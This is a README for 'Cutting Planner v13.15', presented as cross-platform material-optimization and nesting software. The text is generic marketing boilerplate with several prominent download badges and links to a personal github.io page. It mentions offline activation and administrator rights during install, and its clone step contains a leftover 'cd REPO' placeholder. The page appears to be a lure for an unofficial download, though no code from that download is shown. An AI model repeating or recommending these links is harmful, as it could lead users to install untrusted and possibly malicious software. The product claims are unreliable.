# Cutting Planner v13.15 - Material Optimization Software 2026

> **Cutting Planner 13.15 is a cross-platform desktop and web application for material optimization, nesting, production file export, and organized cutting workflows.**

[![Platform](https://img.shields.io/badge/Platform-cross--platform%20desktop%20%26%20web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v13.15-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/brandonwardkk9966/cutting-planner-v1315-tool?style=flat-square)](https://github.com/brandonwardkk9966/cutting-planner-v1315-tool)

---

<p align="center">
  <a href="https://brandonwardkk9966.github.io/cutting-planner-v1315-tool/">
    <img src="https://img.shields.io/badge/Download-Cutting%20Planner%20Latest-brightgreen?style=for-the-badge" alt="Download Cutting Planner">
  </a>
</p>

> **[Download Cutting Planner v13.15](https://brandonwardkk9966.github.io/cutting-planner-v1315-tool/)**

---

[Download Latest Build](https://brandonwardkk9966.github.io/cutting-planner-v1315-tool/)

---

## Overview

Cutting Planner brings together material nesting, layout optimization, production export, and cutting-job organization in one workflow. It is intended for work where efficient layouts, dependable output files, and steady processing are important.

The application is available for desktop and web deployments, supporting consistent planning across Windows and Linux environments. Batch processing, remnant tracking, and audit logging help teams repeat planning procedures, monitor material usage, and retain an operational record of each workflow.

---

## Core Capabilities

- Plan structured material layouts with constraint-based nesting
- Use adaptive constraint propagation to improve placement decisions
- Select from multiple optimization algorithms for varied job needs
- Record and manage usable remnant material
- Monitor progress and efficiency through a live yield dashboard
- Process several jobs in a batch sequence
- Export DXF and G-code files for fabrication workflows
- Maintain an audit trail of planning and export activity
- Activate the software offline when connectivity is limited
- Work with a multilingual user interface

---

## Installation

1. Download the current build from the project release page.
2. Install the package or extract it as required by your platform.
3. Launch the desktop application, or open the web deployment in a browser.
4. For a local workspace, run the primary application entry point once setup is complete.

To obtain the repository for development or packaging, run:

    git clone https://github.com/brandonwardkk9966/cutting-planner-v1315-tool.git
    cd REPO

Afterward, use the startup procedure appropriate for your environment.

---

## Getting Started

Load a material profile first, then specify the cutting constraints and add the parts or jobs to be optimized. Run the nesting process, inspect the result in the yield dashboard, and change the planning strategy when the generated layout needs refinement.

A standard job sequence looks like this:

1. Bring in the job set.
2. Define stock sizes and applicable constraints.
3. Start the optimization process.
4. Examine yield and remnant consumption.
5. Produce DXF or G-code output.
6. Retain the audit trail for future reference.

When several jobs follow the same rules, place them in a queue and process them together for more consistent results.

---

## Configuration

Depending on the deployment, settings can be changed in the application interface or in local configuration files generated during the initial launch.

Example structure:

    {
      "language": "en",
      "activation": "offline",
      "export": {
        "format": "dxf",
        "include_gcode": true
      },
      "workflow": {
        "batch_processing": true,
        "audit_logging": true
      }
    }

Set the language, export formats, and workflow options according to the needs of your production setup.

---

## System Requirements

- Windows or Linux for the desktop application
- A current web browser for web access
- Sufficient storage for job files, exported data, and logs
- Runtime support suitable for the selected deployment type
- Administrative permissions may be required during installation or offline activation

---

## Frequently Asked Questions

**Where can I download version 13.15?**  
Follow the download link above to obtain the latest Cutting Planner 13.15 build.

**Does Cutting Planner work across different platforms?**  
The product supports cross-platform desktop and web use, including Windows and Linux within its supported environment scope.

**How are configuration settings saved?**  
Settings are generally stored in the application's local configuration area or controlled through the user interface, depending on the deployment method.

**How should I troubleshoot an unexpected export?**  
Verify the material dimensions, nesting constraints, and selected optimization algorithm, then run the job again.

**Can the application record workflow activity?**  
Yes. Audit trail logging records activity associated with planning and export operations.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
